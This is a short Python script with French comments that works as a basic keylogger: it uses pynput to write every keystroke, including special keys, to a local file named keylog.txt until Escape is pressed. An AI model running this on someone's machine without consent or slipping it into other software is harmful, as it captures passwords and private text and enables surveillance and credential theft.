from pynput import keyboard
import os

with open("keylog.txt", "w") as fic:
    def on_press(key):
        try:
            # Écrire les touches alphanumériques
            fic.write(key.char)
        except AttributeError:
            # Écrire une description pour les touches spéciales
            fic.write(f" [{key}] ")
            if key == keyboard.Key.esc:
                # Stop listener
                return False

    # Démarrer le listener
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
        